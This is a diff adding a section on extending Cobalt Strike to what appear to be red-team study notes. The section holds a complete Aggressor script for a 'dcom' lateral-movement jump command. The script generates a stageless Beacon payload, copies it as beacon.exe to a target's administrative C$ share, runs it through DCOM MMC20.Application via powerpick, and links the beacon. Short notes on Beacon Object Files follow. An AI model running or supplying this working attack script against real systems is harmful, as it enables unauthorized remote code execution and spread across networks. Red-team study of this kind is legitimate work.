@@ -692,3 +692,48 @@ post-ex {
     set amsi_disable "true";
 }
 ```
+
+## Extending Cobalt Strike
+### Agressor scripts
+### Jump and remote-exec
+- https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#beacon_remote_exploit_register
+- https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#beacon_remote_exec_method_register
+
+#### Jump dcom command
+- Using https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Invoke-DCOM.ps1
+```
+sub invoke_dcom
+{
+    local('$handle $script $oneliner $payload');
+
+    # acknowledge this command1
+    btask($1, "Tasked Beacon to run " . listener_describe($3) . " on $2 via DCOM", "T1021");
+
+    # read in the script
+    $handle = openf(getFileProper("C:\\Tools", "Invoke-DCOM.ps1"));
+    $script = readb($handle, -1);
+    closef($handle);
+
+    # host the script in Beacon
+    $oneliner = beacon_host_script($1, $script);
+
+    # generate stageless payload
+    $payload = artifact_payload($3, "exe", "x64");
+
+    # upload to the target
+    bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\beacon.exe", $payload);
+
+    # run via powerpick
+    bpowerpick!($1, "Invoke-DCOM -ComputerName  $+  $2  $+  -Method MMC20.Application -Command C:\\Windows\\Temp\\beacon.exe", $oneliner);
+
+    # link if p2p beacon
+    beacon_link($1, $2, $3);
+}
+
+beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
+```
+
+### Beacon Object Files
+- Beacon Object Files (BOFs) are a post-ex capability that allows for code execution inside the Beacon host process.
+- BOFs are essentially tiny COFF objects (written in C or C++) on which Beacon acts as a linker and loader. 
+- Download https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/beacon.h
